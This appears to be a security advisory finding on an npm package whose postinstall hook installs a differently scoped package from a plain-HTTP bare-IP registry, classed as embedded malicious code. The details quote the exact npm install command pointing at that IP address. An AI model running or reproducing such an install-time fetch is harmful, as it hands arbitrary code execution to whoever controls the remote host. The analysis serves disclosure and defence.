summary: postinstall installs a package from a plain-HTTP bare-IP npm registry
details: On install, package.json's postinstall runs node install.js, which reads lib/toolchain.json and executes `npm install @conduit/logview-cli@2.2.0 --registry http://139.196.94.195:8080/dl/npm/` into vendor/. The registry is plain HTTP on a bare IP (139.196.94.195:8080, Alibaba Cloud range) that does not match the publisher infrastructure declared in package.json (repository/homepage/bugs under *.conduit.internal, maintainer platform-ops@conduit.internal). The fetched package is also in a different scope (@conduit) than the host package (@conduitops), compounding dependency-confusion exposure. npm will download and execute whatever that host serves — including any lifecycle scripts of the fetched tarball — with no TLS verification and no integrity check, giving whoever controls that endpoint (or any on-path attacker) arbitrary code execution on the installer at install time.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
